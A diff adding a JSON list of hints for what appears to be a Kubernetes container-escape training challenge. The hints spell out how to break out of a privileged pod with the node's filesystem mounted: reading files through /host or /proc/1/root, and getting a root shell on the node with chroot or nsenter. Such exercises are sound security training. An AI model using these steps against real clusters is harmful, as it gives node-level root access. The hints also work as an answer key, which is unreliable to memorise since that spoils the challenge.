@@ -1,0 +1,5 @@
+[
+  "Start with a shell: `kubectl -n dojo-escape exec -it escape-pod -- sh`. You're root in the container, but the flag isn't in the container — it's on the node's disk at /root/flag.txt. Notice what's mounted: the pod spec puts the node's `/` somewhere inside the pod.",
+  "Look at `/host`. The hostPath volume mounted the entire node filesystem there, so the node's `/root/flag.txt` is at `/host/root/flag.txt` from inside the pod. One `cat` finishes it.",
+  "No mount needed either: because the pod is `privileged`, the host's real root is at `/proc/1/root`, so `chroot /host sh` (or `cat /proc/1/root/root/flag.txt`, or `nsenter -t 1 -m -p -- sh` after `apk add util-linux`) drops you onto the node as root. Confirm the pod is on the right node with `kubectl -n dojo-escape get pod escape-pod -o wide` (should be dojo-worker)."
+]
